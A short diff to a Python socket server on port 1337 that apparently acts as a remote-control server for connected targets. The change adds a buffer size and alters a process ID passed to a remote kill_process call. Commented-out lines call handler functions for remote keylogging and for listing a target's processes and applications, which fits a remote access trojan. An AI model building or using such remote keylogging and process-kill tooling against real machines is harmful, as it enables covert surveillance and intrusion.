@@ -1,10 +1,13 @@
 import socket as sk
 import threading
+from time import sleep
 
 import test_handle as handler
 
 HOST = '' # Localhost
 PORT = 1337
+
+BUFSIZ = 1024 * 4
 
 MAX_CONNECTION = 1
 
@@ -50,6 +53,7 @@ def summon(conn, addr):
         conn.sendall(b'QUIT') # Quit current command
         break # For testing only 1 command
     conn.close()
+    
 
 
 # Sample authorize
@@ -79,5 +83,4 @@ t.start()
 # handler.list_process(target[1])
 # handler.keylog(target[1], 30)
 # handler.list_application(target[1])
-handler.kill_process(target[1], 16508)
-
+handler.kill_process(target[1], 16316)
